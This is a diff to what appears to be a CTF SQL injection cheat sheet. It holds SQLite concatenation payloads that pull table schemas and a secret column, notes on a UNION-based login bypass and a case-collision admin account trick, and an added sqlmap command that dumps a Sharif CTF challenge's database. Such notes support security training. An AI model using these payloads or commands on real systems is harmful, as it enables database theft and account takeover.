@@ -97,10 +97,15 @@ __[In MsSQL, if second colums is `username` then the payload `' UNION SELECT 1,1
    A username `Admin` can be created and it can be used to sign-in as `admin`
 
 ## Unique-injection
-  *
+*
    ```
     '||(select tbl_name FROM sqlite_master)||'
     '||(select sql FROM sqlite_master)||'
     '||(select secret FROM user WHERE id =1)||'
    ```
-   
+
+## SqlMap Command
+* ```
+  python sqlmap.py -u "http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/login.php" --csrf-token="user_token" --csrf-url="http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/" --data="username=a&password=a&Login=Login&user_token=" --dump
+  ```
+
